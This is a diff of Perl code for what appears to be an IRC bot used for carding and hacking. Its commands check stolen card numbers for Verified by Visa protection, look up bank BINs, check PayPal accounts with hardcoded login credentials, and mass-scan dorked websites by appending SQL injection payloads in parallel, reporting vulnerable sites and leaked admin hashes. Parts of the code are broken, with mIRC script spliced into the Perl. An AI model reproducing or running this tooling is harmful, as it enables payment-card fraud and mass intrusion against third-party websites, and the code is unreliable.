+if ($ipse =~ m/Your IP address is(.*)<br>City:(.*)<br\/>Country:(.*)<br>Continent:(.*)<br>Time/g){
+my ($ipaddress,$city,$country,$continent) = ($1,$2,$3,$4);
+&respond_to_privmsg(\%msg,"14,1[ 9ip14 ] 7 IP ADDRESS :3 $ipaddress");
+&respond_to_privmsg(\%msg,"14,1[ 9ip14 ] 7 CITY :3  $city ");
+&respond_to_privmsg(\%msg,"14,1[ 9ip14 ] 7 COUNTRY :3  $country ");
+&respond_to_privmsg(\%msg,"14,1[ 9ip14 ] 7 Continent :3  $continent ");
+}
+elsif ($ipse =~/Invalid address or IP not found/){
+                &respond_to_privmsg(\%msg,"4,1[ 9ip4 ] 9-4 Invalid IP address!");
+                }
+                }
+#####################################################################################
+        if($msg{'what'} =~ /^!dns (.*)/)
+                {
+                my ($hostingname) = ($1);
+                &respond_to_privmsg(\%msg,"14,1[15,01 Dns 14,01] 04,01Checking 14$hostingname");
+#print "\n";
+my $agent = WWW::Mechanize->new( autocheck => 1 );
+my $formfiller = WWW::Mechanize::FormFiller->new();
+$agent->env_proxy();
+ $agent->get('http://www.ipligence.com/geolocation');
+  $agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+ { local $^W; $agent->current_form->value('ip', ''.$hostingname.''); };
+ $agent->submit();
+ #print $agent->content,"\n";
+my $dnschk=$agent->content;
+if ($dnschk =~ m/Your IP address is(.*)<br>City:(.*)<br\/>Country:(.*)<br>Continent:(.*)<br>Time/g){
+my ($resolved,$city,$country,$continent) = ($1,$2,$3,$4);
+&respond_to_privmsg(\%msg,"14,1[15,01 Dns 14,01]08,01 Resolved to09$resolved");
+}
+elsif ($dnschk =~/Invalid address or IP not found/){
+                &respond_to_privmsg(\%msg,"14,1[15,01 Dns 14,01] 04,01Could not Resolve Hostname");
+                }
+                }
+############################################################################################
+if($msg{'what'} =~ /^!pirt\s(.*) (.*)/) {
+ my($cip,$cport,$port,%ip,%port,%chan) = ($1,$2,%3,%4,%5,%6);
+ chop($cport);
+ &respond_to_privmsg(\%msg,"14,1[15,1 Port 14,01]00,01 Checking...08,01 $cip:$cport");
+ my $agent = WWW::Mechanize->new();
+ my $formfiller = WWW::Mechanize::FormFiller->new();
+ $agent->env_proxy();
+ #$agent->get("http://w00t.usr.sh/toolz/checkport/");
+ $agent->get("http://www.twcontact.com&/port.php?ip=,%port.ip,&port=,%port.port"); # HTTP/1.0
+sub portcheck {
+#  set my %port.ip $1
+ # set my %port.port $2
+  #set my %port.chan $3
+  #sockopen portcheck "www.twcontact.com&80"
+#}
+#on *:sockopen:portcheck: {
+#  sockwrite -n $sockname GET $+(/port.php?ip=,%port.ip,&port=,%port.port) HTTP/1.0
+ # sockwrite -n $sockname Host: www.twcontact.com
+ #sockwrite -n $sockname User-Agent: Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (J2ME/22.478; U; en) Presto/2.5.25 Version/10.54
+  #sockwrite -n $sockname Connection: Close
+  #sockwrite -n $sockname $str($crlf,2);
+#};
+#on *:sockread:portcheck: {
+  var %portcheck
+  sockread %portcheck
+  #If (%portcheck == <title>open</title>) { msg %port.chan $+(%port.ip,:,%port.port) is 3OPEN | sockclose portcheck };
+  #If (%portcheck == <title>closed</title>) { msg %port.chan $+(%port.ip,:,%port.port) is 4CLOSED | sockclose portcheck };
+#}
+#On *:Text:*:#: {
+#  If ($1 == .port) { portcheck $2 $3 $chan }
+#  If ($1 == !port) { portcheck $2 $3 $chan }
+#}
+# On *:Input:#: {
+ # If ($1 == .port) { portcheck $2 $3 $chan }
+ # If ($1 == !port) { portcheck $2 $3 $chan }
+}
+ $agent->form_number(2) if $agent->forms and scalar @{$agent->forms};
+ { local $^W; $agent->current_form->value('addr', ''.$cip.''); };
+ { local $^W; $agent->current_form->value('port', ''.$cport.''); };
+ $agent->submit();
+ #print $agent->content,"\n";
+ my $resultport=$agent->content;  
+ if($resultport =~/is opened/g){
+  &respond_to_privmsg(\%msg,"14,1[15,1 Port 14,01]08 $cip:$cport 09is opened");
+}elsif($resultport = ~/is closed/){
+ &respond_to_privmsg(\%msg,"14,1[15,1 Port 14,01]08 $cip:$cport 09is 04Closed");
+}
+ }
+########################################################################################
+if($msg{'what'} =~ /^$sheccmd\s(\d{16})/){
+                my ($vbvnumb) = ($1);
+                &respond_to_privmsg(\%msg,"14,01[15,1Vbv/Mcsc14,01]00,01 Checking...08,01 $vbvnumb");
+#print "\n";
+my $agent = WWW::Mechanize->new( autocheck => 1 );
+my $formfiller = WWW::Mechanize::FormFiller->new();
+$agent->env_proxy();
+$agent->get('http://w00t.usr.sh/toolz/vbv/');
+$agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+ { local $^W; $agent->current_form->value('cclist', ''.$vbvnumb.''); };
+ $agent->submit();
+# print $agent->content,"\n";
+my $secres=$agent->content;
+if ($secres =~/PROTECTION ACTIVE/g){
+                &respond_to_privmsg(\%msg,"14,1[15,1Vbv/Mcsc14,01]08,01 $vbvnumb04,01 Protection Active!");
+}elsif ($secres =~/PROTECTION NOT ACTIVE/){
+                &respond_to_privmsg(\%msg,"14,1[15,1Vbv/Mcsc14,01]08,01 $vbvnumb09,01 Protection Not Active!");
+}elsif ($secres =~/Unknown/){
+                &respond_to_privmsg(\%msg,"14,1[15,1Vbv/Mcsc14,01]08,01 $vbvnumb07,1 Unknown");
+}elsif ($secres =~/INVALID/){
+                &respond_to_privmsg(\%msg,"14,1[15,1Vbv/Mcsc14,01]08,01 $vbvnumb04,01 INVALID");
+                }
+                }
+#####################################################################################
+if($msg{'what'} =~ /^!md5\s(.*)/) {
+ my $mstring = $1;
+ chop($mstring);
+ &respond_to_privmsg(\%msg,"14,1[15,1 md5 14,01]00,01 Generating...08,01 $mstring");
+ my $agent = WWW::Mechanize->new();
+ my $formfiller = WWW::Mechanize::FormFiller->new();
+ $agent->env_proxy();
+ $agent->get("http://w00t.usr.sh/toolz/md5/");
+ $agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+ { local $^W; $agent->current_form->value('encrypt', ''.$mstring.''); };
+ $agent->submit();
+ #print $agent->content,"\n";
+ my $resmd=$agent->content;  
+ if($resmd =~/<font color=#00FF11><b>(.*)<\/b><\/font>/){
+  &respond_to_privmsg(\%msg,"14,1[15,1 md5 14,01]00,01 Generated:04 $1");
+ }elsif($resmd =~/Duplicate entry '(.*)' for key 'md5'/){
+ &respond_to_privmsg(\%msg,"14,1[15,1 md5 14,01]00,01 Already Generated:04 $1");
+}
+else{
+ &respond_to_privmsg(\%msg,"14,1[15,1 md5 14,01]04,01 Can't Generate Hash");
+}
+ }
+#####################################################################################
+        if($msg{'what'} =~ /^!md5decode (.*)/) {
+ my $md = $1;
+ chop($md);
+ &respond_to_privmsg(\%msg,"14,1[15,01 md5 14,01] 04,01Checking 14$md");
+ my $agent = WWW::Mechanize->new();
+ my $formfiller = WWW::Mechanize::FormFiller->new();
+ $agent->env_proxy();
+ $agent->get("http://w00t.usr.sh/toolz/md5/");
+ $agent->form_number(2) if $agent->forms and scalar @{$agent->forms};
+ { local $^W; $agent->current_form->value('decrypt', ''.$md.''); };
+ $agent->submit();
+# print $agent->content,"\n";
+ my $internal=$agent->content;  
+ if($internal =~/<strong>Decrypted: <font color=green>(.*?)<\/font><\/strong><br>/){
+  &respond_to_privmsg(\%msg,"14,1[15,01 md5 14,01]00,01 Decrypted: 09$1");
+ }elsif($internal = ~/Sorry, we couldn't decrypt this md5./){
+ &respond_to_privmsg(\%msg,"14,1[15,01 md5 14,01]09,01 $md04,01 Not Found in database");
+}elsif($internal = ~/Invalid/){
+ &respond_to_privmsg(\%msg,"14,1[15,01 md5 14,01]09,01 $md04 INVALID md5 hash");
+}
+ }
+#####################################################################################
+if($msg{'what'} =~ /^!sha1\s(.*)/) {
+ my $shastring = $1;
+ chop($shastring);
+ &respond_to_privmsg(\%msg,"14,1[15,1 sha1 14,01]00,01 Generating...08,01 $shastring");
+ my $agent = WWW::Mechanize->new();
+ my $formfiller = WWW::Mechanize::FormFiller->new();
+ $agent->env_proxy();
+ $agent->get("http://w00t.usr.sh/toolz/sha1/");
+ $agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+ { local $^W; $agent->current_form->value('encrypt', ''.$shastring.''); };
+ $agent->submit();
+ #print $agent->content,"\n";
+ my $resmd=$agent->content;  
+ if($resmd =~/<font color=#00FF11><b>(.*)<\/b><\/font>/){
+  &respond_to_privmsg(\%msg,"14,1[15,1 sha1 14,01]00,01 Generated:04 $1");
+ }elsif($resmd =~/Duplicate entry '(.*)' for key 'sha1'/){
+ &respond_to_privmsg(\%msg,"14,1[15,1 sha1 14,01]00,01 Already Generated:04 $1");
+}
+else{
+ &respond_to_privmsg(\%msg,"14,1[15,1 sha1 14,01]04,01 Can't Generate Hash");
+}
+ }
+#####################################################################################
+        if($msg{'what'} =~ /^!sha1decode (.*)/) {
+ my $sha = $1;
+ chop($sha);
+ &respond_to_privmsg(\%msg,"14,1[15,01 sha1 14,01] 04,01Checking 14$sha");
+ my $agent = WWW::Mechanize->new();
+ my $formfiller = WWW::Mechanize::FormFiller->new();
+ $agent->env_proxy();
+ $agent->get("http://w00t.usr.sh/toolz/sha1/");
+ $agent->form_number(2) if $agent->forms and scalar @{$agent->forms};
+ { local $^W; $agent->current_form->value('decrypt', ''.$sha.''); };
+ $agent->submit();
+ #print $agent->content,"\n";
+ my $internal=$agent->content;  
+ if($internal =~/<strong>Decrypted: <font color=green>(.*?)<\/font><\/strong><br>/){
+  &respond_to_privmsg(\%msg,"14,1[15,01 sha1 14,01]00,01 Decrypted: 09$1");
+ }elsif($internal = ~/Sorry, we couldn't decrypt this sha1./){
+  &respond_to_privmsg(\%msg,"14,1[15,01 sha1 14,01]09,01 $sha04,01 Not Found in database");
+ }elsif($internal = ~/Invalid/){
+  &respond_to_privmsg(\%msg,"14,1[15,01 sha1 14,01]09,01 $sha04 INVALID sha1 hash");
+ }
+  }
+###########################################################################################
+        if($msg{'what'} =~ /^!transid (.*)/)
+                {
+                my ($words) = ($1);
+                chop($words);
+                &respond_to_privmsg(\%msg,"14,1[15,01 Translator14,01 ] 04,01Translating 08$words");
+#print "\n";
+my $agent = WWW::Mechanize->new( autocheck => 1);
+my $formfiller = WWW::Mechanize::FormFiller->new();
+$agent->env_proxy();
+$agent->get('http://translate.reference.com/');
+  { local $^W; $agent->current_form->value('src', 'id'); };
+  { local $^W; $agent->current_form->value('dst', 'en'); };
+  { local $^W; $agent->current_form->value('query', ''.$words.''); };
+  $agent->submit();
+  #print $agent->content,"\n";
+my $tranzid=$agent->content;
+if ($tranzid =~ m/<div class=\"translateTxt\" >(.*)/){
+&respond_to_privmsg(\%msg,"14,1[15,01 Translator14,01 ] 08,01ID-EN: 09$1");
+}
+                }
+#############################@@@@======LOCAL FILE COMMANDS=====@@@@#########################
+#############################CONTACT ME : w00t@hotmail.com################################
+############################################################################################                   
+if($msg{'what'} =~ /^$statecmd (.*)/){
+                my $statesinfo = $1;
+                                                my $statedatabase = "state.txt";
+                                                open FILE,"$statedatabase" or die "Can't open file: $statedatabase";
+                                                my @results=<FILE>;
+                                                close FILE;
+                                                my $statevar = 0;
+                        my $nostatevar = 0;
+                                                my $statex = substr($statesinfo,0,2);
+foreach my $url (@results){
+if($url =~ /$statex\|(.*)/){
+if($statevar  == 0) {
+                                        &respond_to_privmsg(\%msg,"14,01[12State14]7 $statex 04:9 $1");
+ goto finish;
+                      }
+                    }
+                       else{
+                   $nostatevar = 1;
+                   }
+                    }
+                     if($nostatevar == 1) {
+                     &respond_to_privmsg(\%msg,"14,01[12State14]07 Could not Retrieve State.");
+                                }
+                                finish:
+                        }
+############################################################################################                   
+#####################################################################################
+if($msg{'what'} =~ /^$bankcmd\s(\d{6})/){
+                              my $bankinfo = $1;
+                                                my $database = "banklist.txt";
+                                                open FILE,"$database" or die "Can't open file: $database";
+                                                my @results=<FILE>;
+                                                close FILE;
+                                                my $bankvar = 0;
+                        my $chkvar = 0;
+                                                foreach my $url (@results){
+                                                if($url =~ /$bankinfo\|(.*)/){
+                            if($bankvar  == 0) {
+                                                $bankvar = 1;
+                        &respond_to_privmsg(\%msg,"14,1[12BanK..14]0 $1");
+                                            goto finish;
+                      }
+                    }
+                       else{
+                   $chkvar = 1;
+                   }
+                    }
+                     if($chkvar == 1) {
+                     &respond_to_privmsg(\%msg,"14,01[12BanK..14]07,01 Could not retreive bank.");
+                                }
+                                finish:
+                        }
+#############################@@@@======INTERFACE COMMANDS=====@@@@###############################
+                if($msg{'what'} =~ /\!hop (.*)/)
+                {
+                        if(&ctrl_admin(\%msg) == 0){
+                                $irc_socket->write("PART ".$1." ".$2."\n");
+                $irc_socket->write("JOIN ".$1." ".$2."\r\n");
+                                }
+                                }
+######################################################################################
+                if($msg{'what'} =~ /\!join (.*)/)
+                {
+                        my $joinz= $1;
+                        if(&ctrl_admin(\%msg) == 0){
+                $irc_socket->write("JOIN ".$joinz."\r\n");
+                                }
+                                }
+                                                if($msg{'what'} =~ /\!hop (.*)/)
+                {
+                        if(&ctrl_admin(\%msg) == 0){
+                                $irc_socket->write("PART ".$1." ".$2."\n");
+                $irc_socket->write("JOIN ".$1." ".$2."\r\n");
+                                }
+                                }
+######################################################################################
+                if($msg{'what'} =~ /\!part (.*)/)
+                {
+                        my $parted = $1;
+                        if(&ctrl_admin(\%msg) == 0){
+                $irc_socket->write("part ".$parted."\r\n");
+                                }
+                                }
+####################################################################################
+#####################################################################################  
+if($msg{'what'} =~ /\!out(.*)/)
+                {
+                        my $qmsg = $1;
+                        if(&ctrl_admin(\%msg) == 0){
+                                $irc_socket->write("quit ".$qmsg."\r\n");
+                       
+                }
+                }
+               
+######################################################################################
+######################################################################################         
+                                if($msg{'what'} =~ /\!rax (.*)/)
+                {
+                        my $raw = $1;
+                        if(&ctrl_admin(\%msg) == 0){
+                                &respond_to_privmsg(\%msg,"15,1[4RAW15]12 SENDING IRC RAW REQUESTED");
+                                $irc_socket->write($raw."\r\n");
+                        }
+                }
+#############################@@@@======ADDED payPaL Chk!=====@@@@###########################
+#############################CONTACT ME : w00t@hotmail.com################################
+############################################################################################
+                if($msg{'what'} =~ /^$ppcmd (.*)/)
+ 
+                {
+        my ($ppchek) = ($1);
+chop($ppchek);
+&respond_to_privmsg(\%msg,"14,1[12 PAYPAL 14,1]00,1 CHECKiNG...00,1 -9,1${ppchek}00,1-\r\n");
+my $cookie = HTTP::Cookies->new(file => 'cookie',autosave => 1,);              
+my $agent = WWW::Mechanize->new(cookie_jar => $cookie, autocheck => 0, ssl_opts => {verify_hostname => 0},);
+$agent->env_proxy();
+$agent->get('https://www.paypal.com/us/cgi-bin/webscr?cmd=_login-run');
+$agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+$agent->form_number(3);
+{ local $^W; $agent->current_form->value('login_email', 'moviemax@live.it'); };
+{ local $^W; $agent->current_form->value('login_password', 'napster23'); };
+  $agent->submit();
+my $internal=$agent->content;
+if ($internal =~/Please make sure you enter your/){
+&respond_to_privmsg(\%msg,"15,1[12,01 PAYPAL 15]04 Wait...Something Wrong,please contact 09w00t\r\n");
+$irc_socket->write("PRIVMSG w00t :15,1[12,01 PAYPAL 15]04 check login username/password !\r\n");
+                }
+                elsif ($internal =~/Please take a moment to choose and answer 2 security questions./){
+                        &respond_to_privmsg(\%msg,"15,1[12,01 PAYPAL 15]04 Wait...Something Wrong,please contact 09w00t\r\n");
+                        $irc_socket->write("PRIVMSG w00t :15,1[12,01 PAYPAL 15]04 check account security question !\r\n");
+                }
+                else {
+                        #print "Logging you in securely \r\n";
+                        $agent->follow_link( url_regex => qr/login_access/i );
+                        $agent->get('https://www.paypal.com/us/verified/pal='.$ppchek.'');
+                  my $resp=$agent->content;
+                                if ($resp =~/is PayPal Verified/){
+                                &respond_to_privmsg(\%msg,"14,01[15 ResuLT 14]  14,1-00,1${ppchek}14,1- 14,1[9VERIFIED14,1]\r\n");
+                                }
+ 
+                                elsif ($resp =~/is NOT PayPal Verified/){
+                                &respond_to_privmsg(\%msg,"14,01[15 ResuLT 14]  14,1-00,1${ppchek}14,1- 14,1[4,1UNVERIFIED14,1]\r\n");
+                                }
+ 
+                                elsif ($resp =~/Your access to view member information is currently limited/){
+                                        &respond_to_privmsg(\%msg,"14,01[15 ResuLT 14] 04 check account access limit !\r\n");
+                                        #print "Your access to view member information is currently limited. Please try back at another time.\r\n";
+                                }
+ 
+ 
+        }
+}
+
+
+#####################################################################################
+                if($msg{'what'} =~ /\!ip (.*)/)
+                {
+                my ($iploca) = ($1);
+chop($iploca);
+                &respond_to_privmsg(\%msg,"14,1(15:9:15:0 Checking... 1515:9:15: 14) 0::: $iploca :::");
+#print "inizio mechanize\n";
+my $agent = WWW::Mechanize->new( autocheck => 1 );
+my $formfiller = WWW::Mechanize::FormFiller->new();
+$agent->env_proxy();
+ 
+  $agent->get('http://www.ip2location.com/'.$iploca.'');
+   $agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+  #print $agent->content,"\n";
+my $ipwork=$agent->content;
+if ($ipwork =~/<span id=\"dgLookup__ctl2_lblICountry\">(.*?)<\/span>/){
+&respond_to_privmsg(\%msg,"14,1(15:9:15:0 Country 1515:9:15: 14) $1");
+}
+if ($ipwork =~/<span id=\"dgLookup__ctl2_lblIRegion\">(.*?)<\/span>/){
+&respond_to_privmsg(\%msg,"14,1(15:9:15:0 Region 1515:9:15: 14) $1");
+}
+if ($ipwork =~/<span id=\"dgLookup__ctl2_lblICity\">(.*?)<\/span>/){
+&respond_to_privmsg(\%msg,"14,1(15:9:15:0 City 1515:9:15: 14) $1");
+}
+if ($ipwork =~/<span id=\"dgLookup__ctl2_lblITimeZone\">(.*?)<\/span>/){
+&respond_to_privmsg(\%msg,"14,1(15:9:15:0 Time 1515:9:15: 14) $1");
+}
+if ($ipwork =~/<span id=\"dgLookup__ctl2_lblINetSpeed\">(.*?)<\/span>/){
+&respond_to_privmsg(\%msg,"14,1(15:9:15:0 Speed 1515:9:15: 14) $1");
+}
+if ($ipwork =~/<span id=\"dgLookup__ctl2_lblIISP\">(.*?)<\/span>/){
+&respond_to_privmsg(\%msg,"14,1(15:9:15:0 IPS 1515:9:15: 14) $1");
+}
+if ($ipwork =~/<span id=\"dgLookup__ctl2_lblIDomain\">(.*?)<\/span>/){
+&respond_to_privmsg(\%msg,"14,1(15:9:15:0 Domain 1515:9:15: 14) $1");
+}
+}
+
+ if($msg{'what'} =~ /\!zipcode\s(\d{5})/)
+                {
+                my ($zipcheck) = ($1);
+                &respond_to_privmsg(\%msg,"14,1(15:9:15:0 Checking Zipcode 1515:9:15: 14) 0::: $zipcheck ::: please wait...");
+#print "inizio mechanize\n";
+my $agent = WWW::Mechanize->new( autocheck => 1 );
+my $formfiller = WWW::Mechanize::FormFiller->new();
+$agent->env_proxy();
+ 
+  $agent->get('http://zip4.usps.com/zip4/citytown_zip.jsp');
+   $agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+  { local $^W; $agent->current_form->value('zip5', ''.$zipcheck.''); };
+  $agent->submit();
+  #print $agent->content,"\n";
+my $zipse=$agent->content;
+if ($zipse =~/headers=\"pre\"><b>(.*?)<\/b><\/td>/){
+$luogo = $1;
+                &respond_to_privmsg(\%msg,"14,1(15:9:15:0 Checking Zipcode 1515:9:15: 14) 0::: $luogo ::: ");
+}
+elsif ($zipse =~/The ZIP Code you entered could not be found in our database/){
+                &respond_to_privmsg(\%msg,"14,1(15:9:15:0 Checking Zipcode 1515:9:15: 14) 0::: $zipcheck Not found! ::: ");
+}
+}
+
+if($msg{'what'} =~ /^!zip\s(\d{5})/)
+		{
+		my ($zipcheck) = ($1);
+		&respond_to_privmsg(\%msg,"14,1[ 15Zip14 ]0,1 Checking...08 $zipcheck");
+#print "\n";
+my $agent = WWW::Mechanize->new( autocheck => 1 );
+my $formfiller = WWW::Mechanize::FormFiller->new();
+$agent->env_proxy();
+$agent->get('http://www.zipinfo.com/cgi-local/zipsrch.exe?cnty=cnty&ac=ac&zip=');
+$agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+  { local $^W; $agent->current_form->value('zip', ''.$zipcheck.''); };
+  $agent->submit();
+  #print $agent->content,"\n";
+my $zipse=$agent->content;
+if ($zipse =~/<td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font>/g){
+my ($city) = ($1);
+my ($state) = ($2);
+		&respond_to_privmsg(\%msg,"14,1[ 15Zip14 ]3 $city | $state");
+}
+elsif ($zipse =~/is not currently assigned by the US Postal Service to any city./){
+		&respond_to_privmsg(\%msg,"14,1[ 15Zip14 ]8 $zipcheck04 NOT FOUND!");
+}
+}
+if($msg{'what'} =~ /\!chkpp (.*)/)
+		{
+		my ($ppchek) = ($1);
+chop($ppchek);
+		&respond_to_privmsg(\%msg,"15[7CHECKiNGPAYPAL15] CHECKiNG... -$ppchek- ");
+#print "inizio mechanize\n";
+my $agent = WWW::Mechanize->new( autocheck => 1 );
+my $formfiller = WWW::Mechanize::FormFiller->new();
+$agent->env_proxy();
+$agent->get('https://www.paypal.com/us/verified/pal='.$ppchek.'');
+   $agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+  $agent->form_number(3);
+  { local $^W; $agent->current_form->value('login_email', 'sphiinx@gmail.com'); };
+  { local $^W; $agent->current_form->value('login_password', '123456aa'); };
+  $agent->submit();
+  $agent->follow_link('n' => 7);
+  #print $agent->content,"\n";
+my $internal=$agent->content;
+if ($internal =~/is NOT PayPal Verified/){
+		&respond_to_privmsg(\%msg,"14[12 PayPaL 14] 05${ppchek} - 04Not Verified!");
+}
+if ($internal =~/<td class=\"emphasis\">(.*?)<\/td>/){
+		&respond_to_privmsg(\%msg,"14[12 PayPaL 14] 05${ppchek} - 09$1");
+}
+}
+		if($msg{'what'} =~ /\!raw (.*)/)
+		{
+			my $raw = $1;
+			if(&ctrl_admin(\%msg) == 0){
+				&respond_to_privmsg(\%msg,"14[04 RaW 14]08 SENDING IRC RAW REQUESTED");
+				$irc_socket->write($raw."\r\n");
+			}
+		}
+if($msg{'what'} =~ /\!q (.*)/)
+		{
+			my $qmsg = $1;
+			if(&ctrl_admin(\%msg) == 0){
+				$irc_socket->write("quit ".$qmsg."\r\n");
+			
+		}
+		}
+ 
+######################################################################
+if($msg{'what'} =~ /\!vbbbbbbbbbbbbbv\s(\d{16})/)
+		{
+		my ($vbvcard) = ($1);
+		&respond_to_privmsg(\%msg,"15[7CHECKiNG-VBV15] CHECKiNG... 07 -$vbvcard-  ");
+#print "inizio mechanize\n";
+my $agent = WWW::Mechanize->new( autocheck => 1 );
+my $formfiller = WWW::Mechanize::FormFiller->new();
+$agent->env_proxy();
+
+  $agent->get('https://verified.visa.com/aam/data/default/landing.aam?partner=default&resize=yes');
+   $agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+  $agent->form_number(1);
+  { local $^W; $agent->current_form->value('pan', ''.$vbvcard.''); };
+ $agent->click('');
+  #print $agent->content,"\n";
+my $vbvall=$agent->content;
+       open(FILE3,">>VBVPage.html") or die "$!";
+       #print FILE3 "$vbvall\n";
+            close FILE3;
+if ($vbvall =~/scrn_2_hdr_text\.jpg/){
+		&respond_to_privmsg(\%msg,"15[7CHECKiNG-VBV15] Verified By Visa for... 07 -$vbvcard-00  is not eligible");
+}
+#<form name="aam" method="post" action="
+elsif ($vbvall =~/name=\"aam\" method=\"post\" action=\"https:\/\/(.*?)\//){
+		&respond_to_privmsg(\%msg,"15[7CHECKiNG-VBV15] Verified By Visa for... 07 -$vbvcard-12  is Secured at $1 ");
+}
+elsif ($vbvall =~/action=\"https:\/\/(.*?)\//){
+		&respond_to_privmsg(\%msg,"15[7CHECKiNG-VBV15] Verified By Visa for... 07 -$vbvcard-12  is Secured at $1 ");
+}
+#action="https://
+}
+
+		if($msg{'what'} =~ /\!check221 (.*)/)
+		{
+			my $website = $1;
+			&respond_to_privmsg(\%msg,"15[7SERViCE15]11 CHECKiNG ");
+				my $agent = WWW::Mechanize->new( autocheck => 1 );
+				my $formfiller = WWW::Mechanize::FormFiller->new();
+				$agent->env_proxy();
+
+				$agent->get("http://nubiescript.com/demo/sqlinject/?mysql=1&vuln=1&link=$website");
+				$agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+				$agent->submit();
+			#print "ecco: $website--\n";
+			if ($agent->content() =~/Database\: \<font color\=red\>(.*?)<\/font>/) {
+			my $founddat = $1;
+			&respond_to_privmsg(\%msg,"15[7SERViCE15]11 Database: ".$founddat."  ");
+				}if ($agent->content() =~ /Version\: \<font color\=red\>(.*?)<\/font>/) {
+				my $verfound = $1;
+				&respond_to_privmsg(\%msg,"15[7SERViCE15]11 Version: ".$verfound."  ");
+					}if ($agent->content() =~ /User\: \<font color\=red\>(.*?)<\/font>/) {
+					my $usefound = $1;
+					&respond_to_privmsg(\%msg,"15[7SERViCE15]11 User: ".$usefound."  ");
+		} elsif ($agent->content() =~ /\Found over 50 columns \- scanning skipped\! Something is wrong/) {
+		&respond_to_privmsg(\%msg,"15[7SERViCE15]11 Site not Vuln  ");
+		}
+}
+		if($msg{'what'} =~ /\!securevuln (.*?) (.*)/)
+		{
+			my ($bugging,$dork) = ($1,$2);
+			if(&ctrl_admin(\%msg) == 0){
+				my $pm = new Parallel::ForkManager($parallel_fork);
+				my $cnt_site = 0;
+				&respond_to_privmsg(\%msg,"15[7SQL15]12 DORK: ".$dork." ");
+				&respond_to_privmsg(\%msg,"15[7SQL15]12 BUGGiNG PAGE: ".$bugging." ");
+				my @results = &find_all_sites(\%msg,$dork);
+				foreach my $single_site ( @results )
+				{
+					$cnt_site += 1;
+
+				if($cnt_site %40 == 0)
+					{
+						&respond_to_privmsg(\%msg,"15[7TESTED15]12 YOU HAVE TESTED ".$cnt_site." of ".scalar(@results)." ");
+					}
+					$pm->start and next;
+						#forked
+						my $test_site  = "http://".$single_site . $bugging;
+						my $agent = WWW::Mechanize->new( autocheck => 1 );
+						my $formfiller = WWW::Mechanize::FormFiller->new();
+						$agent->env_proxy();
+
+  						$agent->get("http://nubiescript.com/demo/sqlinject/?mysql=1&vuln=1&link=$test_site");
+   						$agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+ 						 $agent->submit();
+					#print "ecco: $test_site--\n";
+							if ($agent->content() =~/Version\: \<font color\=red\>(.*?)<\/font>/) {
+							my $founddat = $1;
+							&respond_to_privmsg(\%msg,"15[7VULN-SECURE15]11 $single_site VERSION: ".$founddat."  ");
+
+
+}
+						#end forked
+
+					$pm->finish;
+				}
+				$pm->wait_all_children;
+				&respond_to_privmsg(\%msg,"15[7FINISH15]12 YOU HAVE COMPLETED TEST ");
+
+
+			}
+		}
+
+		if($msg{'what'} =~ /\!sql2 (.*?) (.*?) (.*)/)
+		{
+			my ($bug,$dork, $inj) = ($1,$2,$3);
+chop($inj);
+			if(&ctrl_admin(\%msg) == 0){
+				my $pm = new Parallel::ForkManager($parallel_fork);
+				my $cnt_site = 0;
+				&respond_to_privmsg(\%msg,"15[7SQL15]12 BUG: ".$bug." ");
+				&respond_to_privmsg(\%msg,"15[7SQL15]12 DORK: ".$dork." ");
+				&respond_to_privmsg(\%msg,"15[7SQL15]12 INJECTION-CODE: ".$inj." ");
+				my @results = &find_all_sites(\%msg,$dork);
+				foreach my $single_site ( @results )
+				{
+					$cnt_site += 1;
+					if($cnt_site %100 == 0)
+					{
+						&respond_to_privmsg(\%msg,"15[7TESTED15]12 YOU HAVE TESTED ".$cnt_site." of ".scalar(@results)." ");
+					}
+					$pm->start and next;
+						#forked
+						chop($single_site);
+						chop($single_site);
+						my $print_site = "http://".$single_site . $bug . $inj;
+						my $testodel_site = "http://".$single_site . $inj;
+						
+						my $html_site  = &http_request($testodel_site);
+						if($html_site  =~ /sql syntax/)
+						{
+							&respond_to_privmsg(\%msg,"15[7SQL_VULN15]12 LINK: ".$print_site." ");
+
+					}
+						elsif($html_site  =~ /sql error/)
+						{
+							&respond_to_privmsg(\%msg,"15[7SQL_VULN15]12 LINK: ".$print_site." ");
+						}
+
+						elsif($html_site  =~ /right syntax to use near/)
+						{
+							&respond_to_privmsg(\%msg,"15[7SQL_VULN15]12 LINK: ".$print_site." ");
+						}
+						elsif($html_site  =~ /syntax error converting/)
+						{
+							&respond_to_privmsg(\%msg,"15[7SQL_VULN15]12 LINK: ".$print_site." ");
+						}
+                                                elsif($html_site  =~ /number of columns/)
+                                                {
+                                                        &respond_to_privmsg(\%msg,"15[7SQL_VULN15]12 LINK: ".$print_site." ");
+                                                }
+
+						elsif($html_site  =~ /unclosed quotation/)
+						{
+							&respond_to_privmsg(\%msg,"15[7SQL_VULN15]12 LINK: ".$print_site." ");
+						}
+                                                elsif($html_site  =~ /admin\:\w{32}/)
+                                                {
+                                                        &respond_to_privmsg(\%msg,"15[7SQL_VULN_09admin15]12 LINK: ".$print_site." ");
+                                                }
+                                                elsif($html_site  =~ /administrator\:\w{32}/)
+                                                {
+                                                        &respond_to_privmsg(\%msg,"15[7SQL_VULN_09admin15]12 LINK: ".$print_site." ");
+                                                }
+                                                elsif($html_site  =~ /root\:\w{32}/)
+                                                {
+                                                        &respond_to_privmsg(\%msg,"15[7SQL_VULN_09root15]12 LINK: ".$print_site." ");
+                                                }
+                                                elsif($html_site  =~ /Invalid argument supplied for foreach/)
+                                                {
+                                                        &respond_to_privmsg(\%msg,"15[7SQL_VULN_15]12 LINK: ".$print_site." ");
+                                                }
+
+						#end forked
+
+					$pm->finish;
+				}
+				$pm->wait_all_children;
